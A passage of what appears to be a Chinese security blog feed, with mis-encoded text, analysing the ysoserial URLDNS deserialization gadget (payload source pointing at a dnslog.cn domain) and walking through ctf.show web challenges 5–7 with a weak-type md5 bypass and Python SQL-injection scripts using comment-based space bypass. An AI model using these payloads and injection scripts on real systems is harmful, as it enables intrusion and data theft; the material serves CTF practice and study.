*/</span></span><br></pre></td></tr></table></figure><p>åœ¨ç¬¬äºŒè¡Œå†™åˆ°è§¦å‘æ¼æ´çš„æ–¹æ³•ä¸º<code>URL.hashCode()</code></p><p>ç¬¬ä¸‰è¡Œå†™åˆ°ï¼Œè¿™ä¸ªgadgetçš„ä¼šäº§ç”Ÿçš„æ•ˆæœæ˜¯è¿›è¡Œä¸€æ¬¡<code>dns lookup(åŸŸåè§£æ)</code>ï¼Œè¿™ä¸ªåˆ©ç”¨é“¾åœ¨ç›®æ ‡<strong>èƒ½å¤Ÿå‡ºç½‘çš„æƒ…å†µä¸‹</strong>å¯ä»¥ä½¿ç”¨ã€‚</p><h3 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h3><p>åœ¨æ³¨é‡Šé‡Œé¢ï¼Œåˆ©ç”¨é“¾çš„è°ƒç”¨æ ˆå†™çš„å¾ˆæ¸…æ¥š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><p>ä¹‹åè°ƒè¯•çš„æ—¶å€™ï¼Œå¯ä»¥åœ¨è¿™äº›åœ°æ–¹åˆ†åˆ«ä¸‹æ–­ç‚¹ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥åœ¨<code>URL.hashCode()</code>å¤„ä¸‹æ–­ç‚¹ï¼‰ç„¶åè°ƒè¯•åˆ†æã€‚</p><h2 id="æºç "><a href="#æºç " class="headerlink" title="æºç "></a>æºç </h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> <span class="keyword">implements</span> <span class="title">ObjectPayload</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">                URLStreamHandler handler = <span class="keyword">new</span> SilentURLStreamHandler();</span><br><span class="line"></span><br><span class="line">                HashMap ht = <span class="keyword">new</span> HashMap(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                URL u = <span class="keyword">new</span> URL(<span class="keyword">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url);</span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="comment">// write by my self</span></span><br><span class="line">            String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">            <span class="comment">//    PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">            PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>URLStreamHandler</code>è¿˜æ²¡æœ‰åˆ†æè¿‡ä½œç”¨ï¼Œ</p><p>å…ˆå¼•å…¥pç¥åšå®¢ä¸Šçš„è¯´æ˜</p><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆï¼šURLStreamHandlerï¼Œå¼•ç”¨åˆ«äººå¯¹è¿™ä¸ªç±»çš„ç†è§£ã€‚</span><br></pre></td></tr></table></figure><p>   ä¸€èˆ¬è€Œè¨€ï¼Œ URL çš„æ ¼å¼æ˜¯ï¼š protocol://[authority]hostname:port/resource?queryString ã€‚ URL ç±»èƒ½å¤Ÿè§£æå‡º protocolã€ hostname ã€ port ç­‰ä¿¡æ¯ã€‚ Protocol å†³å®šäº†äº¤äº’è§„èŒƒï¼Œé€šç”¨çš„åè®®ï¼Œæ¯”å¦‚ HTTP ã€ File ã€ FTP ç­‰åè®®ï¼Œ JDK è‡ªå¸¦äº†é»˜è®¤çš„é€šè®¯å®ç°ã€‚å½“ç„¶ï¼Œè‡ªå®šä¹‰å®ç°æ˜¯å…è®¸çš„ã€‚ Hostname å’Œ port ä¸€èˆ¬ç”¨äº Socket æˆ–è€…åŸºäº Socket å…¶ä»–åè®®é€šè®¯æ–¹å¼ã€‚Resource å³èµ„æºä¸Šä¸‹æ–‡ã€‚å¯èƒ½è¯»è€…åˆ©ç”¨ URL ï¼Œé€šè¿‡æŒ‡å®šåè®®ï¼ˆ protocol ï¼‰æ¥è·å–æŒ‡å®šèµ„æºçš„è¯»å†™ï¼Œæ¯”å¦‚ JDK å†…ç½®äº†HTTP ã€ File ã€ FTP ç­‰åè®®çš„å¤„ç†æ–¹æ³•ã€‚</p><p>   åœ¨æˆåŠŸåœ°æ„é€  URL å®ä¾‹ä¹‹åï¼Œ URL API ä¸­å®šä¹‰äº†ä¸€ä¸ª openConnection() æ–¹æ³•ï¼Œè¿”å›ä¸€ä¸ª java.net.URLConnection æŠ½è±¡ç±»å‹çš„å®ä¾‹ã€‚ä¸è¿‡ï¼Œè¿™é‡Œ URL å¯¹è±¡æ˜¯ä»£ç†å¯¹è±¡ï¼Œå®é™…è°ƒç”¨çš„æ˜¯ï¼Œ java.net.URLStreamHandler å¯¹è±¡çš„ openConnection() æ–¹æ³•ã€‚</p><p>ã€€ã€€æˆ‘è§‰å¾—å¯ä»¥ç†è§£ä¸ºURLStreamHandler handler = new SilentURLStreamHandler();æ˜¯åˆå§‹åŒ–ä¸€ä¸ªæ–¹æ³•ï¼Œåˆ°æ—¶å€™ä½ çš„URLå®ä¾‹ä¼šæ ¹æ®è¿™ä¸ªç±»æ–¹æ³•è°ƒç”¨ä¸åŒçš„æ“ä½œã€‚openConnectionå’ŒgetHostAddressæ˜¯å¯ä»¥è‡ªå®šä¹‰çš„ï¼Œè¯´æ˜åè®®å¯ä»¥è‡ªå®šä¹‰ï¼Œè‡ªå®šä¹‰çš„åè®®åšè‡ªå®šä¹‰çš„æ“ä½œ</p></blockquote><h2 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h2><h3 id="è°ƒè¯•ç¯å¢ƒ"><a href="#è°ƒè¯•ç¯å¢ƒ" class="headerlink" title="è°ƒè¯•ç¯å¢ƒ"></a>è°ƒè¯•ç¯å¢ƒ</h3><ul><li><p>MacOs(10.15.7)</p></li><li><p>Java(jdk 1.8)</p><blockquote><p>å¿…é¡»æ˜¯ 1.8 ä»¥åï¼Œå› ä¸ºåœ¨1.8 ä»¥å‰HashMap.readObject() æ–¹æ³•ä¸­æ²¡æœ‰è°ƒç”¨ HashMap.putVal() æ–¹æ³•ï¼Œè§¦å‘ä¸äº†gadget</p></blockquote></li></ul><h3 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h3><p>æ¯ä¸€ä¸ªgadgetçš„javaç±»ä¸­éƒ½è‡ªå¸¦ä¸€ä¸ª<code>main</code>æ–¹æ³•ï¼Œä½¿ç”¨<code>PayloadRunner</code>æ‰§è¡Œè¿™ä¸ªpayloadï¼Œæ‰€ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªè¿›è¡Œè°ƒè¯•ï¼Œåœ¨<code>PayloadRunner</code>ä¸­ï¼Œæœ‰ä¸€ä¸ª<code>Command</code>ï¼Œå³éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102512107.png" alt="image-20201118102512107"></p><p>é»˜è®¤çš„<code>command</code>æ˜¯è°ƒç”¨<code>calc.exe</code></p><p>ç”±äºæœ¬gadgetæ˜¯ä¸èƒ½è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼Œåªèƒ½è¿›è¡Œä¸€æ¬¡DNSæŸ¥è¯¢ï¼Œæ‰€ä»¥éœ€è¦å¯¹<code>command</code>è¿›è¡Œèµ‹å€¼ï¼Œè¿™é‡Œåœ¨å…è´¹çš„<code>http://www.dnslog.cn/</code>è¯·æ±‚ä¸€ä¸ªå­åŸŸå</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118102845625.png" alt="image-20201118102845625"></p><p>ç”¨è¿™ä¸ªå­åŸŸåèµ‹å€¼<code>command</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// write by my self</span></span><br><span class="line">    String[] command = &#123;<span class="string">&quot;http://mqfbep.dnslog.cn&quot;</span>&#125;;</span><br><span class="line">    <span class="comment">// PayloadRunner.run(URLDNS.class, args);</span></span><br><span class="line">    PayloadRunner.run(URLDNS.class, command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œä¸Šè¿°<code>command</code>ä¸­çš„<code>http://</code>ä¸èƒ½çœç•¥ï¼Œå› ä¸ºåœ¨<code>getObject() -&gt; new URL()</code>çš„æ—¶å€™ï¼Œä¼šæŠŠ<code>command</code>ä¼ å…¥å‚æ•°ï¼Œåœ¨æ„é€ æ–¹æ³•é‡Œï¼Œåˆ¤æ–­äº†åè®®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = start ; !aRef &amp;&amp; (i &lt; limit) &amp;&amp;</span><br><span class="line">                     ((c = spec.charAt(i)) != <span class="string">&#x27;/&#x27;</span>) ; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;:&#x27;</span>) &#123;</span><br><span class="line"></span><br><span class="line">        String s = spec.substring(start, i).toLowerCase();</span><br><span class="line">        <span class="keyword">if</span> (isValidProtocol(s)) &#123;</span><br><span class="line">            newProtocol = s;</span><br><span class="line">            start = i + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœçœç•¥åè®®ï¼Œåˆ™ä¼šæŠ›å‡ºå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (protocol == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> MalformedURLException(<span class="string">&quot;no protocol: &quot;</span>+original);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ–­ç‚¹è°ƒè¯•"><a href="#æ–­ç‚¹è°ƒè¯•" class="headerlink" title="æ–­ç‚¹è°ƒè¯•"></a>æ–­ç‚¹è°ƒè¯•</h3><p>åœ¨<code>HashMap.ReadObject()</code>å¤„ä¸‹æ–­ç‚¹ï¼Œè¿è¡Œåˆ°<code>putVal</code>å¤„ï¼Œ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118104047928.png" alt="image-20201118104047928"></p><p>è·Ÿè¿›<code>hash(key)</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>key.hashCode()</code>ä¼šè°ƒç”¨<code>URL.hashCode()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">return</span> hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç„¶åä¼šè°ƒç”¨<code>handler.hashCode(this)</code>ï¼Œè¿™ä¸ª<code>handler</code>æ˜¯ä¸€ä¸ª<code>URLStreamHandler</code>ç±»å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the protocol part.</span></span><br><span class="line">    String protocol = u.getProtocol();</span><br><span class="line">    <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">        h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Generate the host part.</span></span><br><span class="line">    InetAddress addr = getHostAddress(u);</span><br><span class="line">   ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°<code>getHostAddress()</code>ï¼Œè¿™ä¸ªå‡½æ•°ä¸­</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (u.hostAddress != <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> u.hostAddress;</span><br><span class="line"></span><br><span class="line">    String host = u.getHost();</span><br><span class="line">    <span class="keyword">if</span> (host == <span class="keyword">null</span> || host.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            u.hostAddress = InetAddress.getByName(host);</span><br><span class="line">            ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨äº†ä¸€ä¸ª<code>InetAddress.getByName(host)</code>æ–¹æ³•ï¼Œé¡¾åæ€ä¹‰ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯å‘èµ·ä¸€æ¬¡DNSè¯·æ±‚ï¼Œè§£æç›®æ ‡åŸŸåã€‚</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201118105831277.png" alt="image-20201118105831277"></p><p>åˆ°è¿™é‡Œï¼Œè¿™ä¸ªåˆ©ç”¨é“¾å·²ç»è°ƒè¯•ç»“æŸï¼Œåˆ©ç”¨é“¾ä¸é•¿ã€‚</p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><ul><li>è¿™ä¸ªåˆ©ç”¨é“¾åªæœ‰<code>dnsè¯·æ±‚</code>ï¼Œå¯ä»¥ç”¨ä½œæ£€æµ‹ç›®æ ‡æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaWeb </category>
          
          <category> ysoserial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaWeb </tag>
            
            <tag> ysoserial </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctf.show é€šå…³è®°å½•(2)</title>
      <link href="/ctf-show02.html"/>
      <url>/ctf-show02.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf.show/">ctf.show</a>å¹³å°web 5-8</p><a id="more"></a><h2 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h2><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013185527811.png" alt="image-20201013185527811" style="zoom:50%;" /><p>è¿›å…¥åç»™å‡ºæºç </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;zh-CN&quot;&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">    &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, minimum-scale&#x3D;1.0, maximum-scale&#x3D;1.0, initial-scale&#x3D;1.0&quot; &#x2F;&gt;</span><br><span class="line">    &lt;title&gt;ctf.show_web5&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;</span><br><span class="line">    &lt;h2&gt;ctf.show_web5&lt;&#x2F;h2&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">    &lt;h3&gt;</span><br><span class="line">    &lt;&#x2F;center&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        $flag&#x3D;&quot;&quot;;</span><br><span class="line">        $v1&#x3D;$_GET[&#39;v1&#39;];</span><br><span class="line">        $v2&#x3D;$_GET[&#39;v2&#39;];</span><br><span class="line">        if(isset($v1) &amp;&amp; isset($v2))&#123;</span><br><span class="line">            if(!ctype_alpha($v1))&#123;</span><br><span class="line">                die(&quot;v1 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(!is_numeric($v2))&#123;</span><br><span class="line">                die(&quot;v2 error&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            if(md5($v1)&#x3D;&#x3D;md5($v2))&#123;</span><br><span class="line">                echo $flag;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;where is flag?&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><h3 id="é¢˜è§£"><a href="#é¢˜è§£" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>å¼±ç±»å‹ + 0e md5</p><p><a href="https://www.cnblogs.com/Oran9e/p/6537204.html">å‚è€ƒèµ„æ–™</a></p><p><code>?v2=240610708&amp;v1=QNKCDZO</code></p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013190453623.png" alt="image-20201013190453623"></p><h2 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h2><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191532526.png" alt="image-20201013191532526" style="zoom:50%;" /><p>æ‰“å¼€ä¹‹åæ˜¯ç†Ÿæ‚‰çš„ç™»å½•æ¡†</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191620597.png" alt="image-20201013191620597"></p><h3 id="é¢˜è§£-1"><a href="#é¢˜è§£-1" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><ol><li><p>å°è¯•ä¸‡èƒ½å¯†ç ï¼Œç™»å½•æˆåŠŸ</p></li><li><p>å°è¯•union è”åˆæ³¨å…¥ï¼Œå‘ç°ç©ºæ ¼è¢«è¿‡æ»¤</p></li><li><p>å°è¯•ä½¿ç”¨/**1**/ï¼Œç»•è¿‡ç©ºæ ¼ï¼Œå‘ç°æ³¨å…¥æˆåŠŸ</p></li></ol><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191746533.png" alt="image-20201013191746533"></p><p>æ ¹æ®ä¸Šè¿°ï¼Œå†™å‡ºexp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://69696014-1b18-4d83-8fa9-37db705f4987.chall.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database();#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;flag&#x27;;#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">&quot;1&#x27; union select 1,group_concat(flag),3 from flag;#&quot;</span></span><br><span class="line"></span><br><span class="line">sql = sql.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**1**/&quot;</span>)</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: sql,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url, data=data)</span><br><span class="line"></span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191847924.png" style="zoom:50%;" /><p>æ‰“å¼€ä¹‹åæ˜¯ä¸€ä¸ªç›®å½•</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013191927234.png" alt="image-20201013191927234"></p><h3 id="é¢˜è§£-2"><a href="#é¢˜è§£-2" class="headerlink" title="é¢˜è§£"></a>é¢˜è§£</h3><p>f12æŸ¥çœ‹æºä»£ç ï¼Œè§‚å¯Ÿåˆ°å­˜åœ¨<code>id</code>å‚æ•°ï¼Œå¯èƒ½å­˜åœ¨æ³¨å…¥</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013192001690.png" alt="image-20201013192001690"></p><p>å°è¯•<code>?id=1&#39;or 1=1#</code>å¤±è´¥ï¼Œè¢«æ£€æµ‹å‡ºsqlæ³¨å…¥</p><p>å°è¯•ä½¿ç”¨<code>/**1**/</code>ç»•è¿‡ç©ºæ ¼ï¼Œå‘ç°æˆåŠŸï¼Œä½†æ˜¯ç”±äºæ²¡æœ‰å›æ˜¾ï¼Œä¸èƒ½ä½¿ç”¨è”åˆæ³¨å…¥</p><p>å°è¯•å¸ƒå°”ç›²æ³¨<code>?id=1/**1**/or/**1**/1=1</code>ï¼ŒæˆåŠŸ</p><p><img src="https://gitee.com/ethustdout/pics/raw/master/img/image-20201013192451766.png" alt="image-20201013192451766"></p><p>ç¼–å†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5ebd5a1c-14f2-4ba8-bcb4-8b2faaa6182a.chall.ctf.show/index.php?id=1 and &quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">40</span>):</span><br><span class="line">        sql = <span class="string">&quot;&quot;</span> \</span><br><span class="line">              <span class="string">&quot;((&quot;</span> \</span><br><span class="line">              <span class="string">&quot;select length(group_concat(table_name)) &quot;</span> 